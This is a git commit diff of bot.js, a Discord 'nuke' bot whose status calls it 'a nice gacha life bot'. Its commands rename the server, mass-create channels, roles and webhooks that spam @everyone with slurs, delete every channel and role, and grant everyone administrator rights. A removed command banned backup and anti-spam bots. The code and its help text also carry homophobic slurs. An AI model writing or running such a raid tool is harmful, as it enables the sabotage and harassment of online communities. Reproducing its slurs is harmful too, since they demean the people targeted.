41e605f7aa1714d0970473d77499c3fda0143fd2
teto lover <68622956+shidemuri@users.noreply.github.com>
2021-05-28 21:02:03 -0400

    removed stuff and added infinite replit hosting trick

--- bot.js
+++ bot.js
@@ -1,78 +1,65 @@
 const Discord = require("discord.js");
-const client = new Discord.Client();
+const client = new Discord.Client({ ws: { properties: { $browser: "Discord iOS" }} }); //mobile idle status like notsobot's status
+const vivo = require(`./server`)
 const prefix = '$';
 
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-client.on("ratelimit", () =>{
-    console.log(`RATELIMIT FODA DMS`)
-})
-
-client.on("guildAdd", (guild) =>{
-  guild.systemChannel.send(`thank you for adding this bot! please put me on top role for best experience, thank you.`)
-  //lol
-});
+let i = 0;
 
 client.on("ready", () => { 
     console.clear()
     console.log(`ready for destroy ppl's days`)
-    console.log(`Tefoko V3`)
-    client.user.setActivity(`Tefoko V3 - Prefix: $ [a nice gacha life bot]`);
+    console.log(`Tefoco V3`)
+    client.user.setActivity(`Tefoco V3 - Prefix: $ [a nice gacha life bot]`);
 });
 
-client.on("message", async (message) => {
+client.on("message", (message) => {
     if(message.author.bot) return;
     const args = message.content.slice(prefix.length).trim().split(/ +/g);
     const comando = args.shift().toLowerCase();
-
-    const server = message.guild.channels;
     switch(comando) {
         case "yeet":
             message.delete();
-            if(message.guild.channels > 499) return message.author.send(`too much text channels`)
             let i;
             if(!args.slice(0).join(' ')){ 
                 message.guild.setName('haha admin go grr')
-                for(i = 0; i < 499; i++){
-                    message.guild.createChannel(`haha admin go grr`, {type: `text`}).then(m =>{
+                for(i = 0; i < 251; i++){
+                  if(message.guild.channels.cache.size == "500") break;
+                    message.guild.channels.create(`haha admin go grr`, {type: `text`}).then(m =>{
                         m.createWebhook("get raided faggots").then(w => {
                           const case1hook = new Discord.WebhookClient(w.id, w.token)
                           case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
-                    message.guild.createChannel(`haha admin go grr`, {type: `voice`})
-                    if(message.guild.channels.length > 499) break;
+                    message.guild.channels.create(`haha admin go grr`, {type: `voice`})
                  }
             } else {
                 message.guild.setName(`${args.slice(0).join(' ')}`)
-                for(i = 0; i < 499; i++){
-                    message.guild.createChannel(`${args.slice(0).join(' ')}`, {type: `text`}).then(m =>{
-                        const mch2 = message.channel.id
+                for(i = 0; i < 251; i++){
+                    if(message.guild.channels.cache.size == "500") break;
+                    message.guild.channels.create(`${args.slice(0).join(' ')}`, {type: `text`}).then(m =>{
                         m.createWebhook("get raided faggots").then(w => {
-                          const case2hook = new Discord.WebhookClient(w.id, w.token)                        
+                          const case2hook = new Discord.WebhookClient(w.id, w.token)
                           case2hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
-                    message.guild.createChannel(`${args.slice(0).join(' ')}`, {type: `voice`})
-                    if(message.guild.channels.length > 499) break;
+                    message.guild.channels.create(`${args.slice(0).join(' ')}`, {type: `voice`})
                 }
             }
-            for(i = 0; i == 250; i++) message.guild.createRole({name: 'boiola'})
+            for(i = 0; i == 250; i++) message.guild.roles.create({name: 'boiola'})
         break;
         case "del":
             message.delete();
-            server.deleteAll();
-            message.guild.createChannel(`\uA672`, {type: `text`})
+            message.guild.channels.cache.forEach(m =>{if(m.deletable) m.delete()});
+            message.guild.roles.cache.forEach(r =>{if(r.deletable) r.delete()})
+            message.guild.channels.create(`\uA672`, {type: `text`})
         break;
         case "admall":
             message.delete();
-            message.guild.defaultRole.setPermissions(['ADMINISTRATOR']);
+            message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
         break;
         case "servername":
             message.delete();
-            if(!args.slice(0).join(' ')) return message.channel.send("give a name, dumbass")
+            if(!args[0]) return;
             message.guild.setName(`${args.slice(0).join(' ')}`)
         break;
         case "help":
@@ -81,44 +68,16 @@ client.on("message", async (message) => {
             "prefix: $",
             "$yeet (optional name for the things)- makes a lot of text channels and vcs, and roles, changes the server's name and pings everyone on the new channels",
             "$del - yeets all the channels and only leaves one",
-            "$admall - self explanatory",
+            "$admall -self explanatory",
             "$servername (new server name) - self explanatory",
-            "$antiprotector - bans xenon (backup bot), betterantispam and some captcha bots (dunno if its working)",
-            "$yes (vc id) - plays some weebness", //please for love of god dont hate on this command, i spent almost 1 hour just to find the proper ffmpeg buildpack for heroku and the opus package for this bot
-            "$hentai (vc id) - plays some hornyness", //the song is shooting star technica by ptpd if anyone wonders
             `$help - bruhhh\n`,
             "Bot by paradino, making gachafags and furries lifes worse"]
             message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
         break;
-        case "antiprotector":
-          message.delete()
-          message.guild.ban(`416358583220043796`)
-          message.guild.ban(`501982335076532224`)
-          message.guild.ban(`554631615565922364`)
-          message.guild.ban(`426537812993638400`)
-          message.guild.ban(`159985870458322944`)
-          message.guild.ban(`512333785338216465`)
-        break;
-        case "yes":
-          message.delete();
-          if(!args[0]) return;
-          const vc = client.channels.get(args[0])
-          vc.join().then(connection => {
-            const dispatcher = connection.playFile('./catchthewave.mp3');
-            dispatcher.on("end", end => {vc.leave()});
-          })
-        break;
-        case "hentai":
-          message.delete();
-          if(!args[0]) return;
-          const vcc = client.channels.get(args[0])
-          vcc.join().then(connection => {
-            const dispatcherr = connection.playFile('./sstm.mp3'); //fun fact: the mp3 was taken directly from the ofc site
-            dispatcherr.on("end", end => {vcc.leave()});
-          })
-        break;
     }
 });
+
+vivo()
 
 client.login(process.env.token);
 
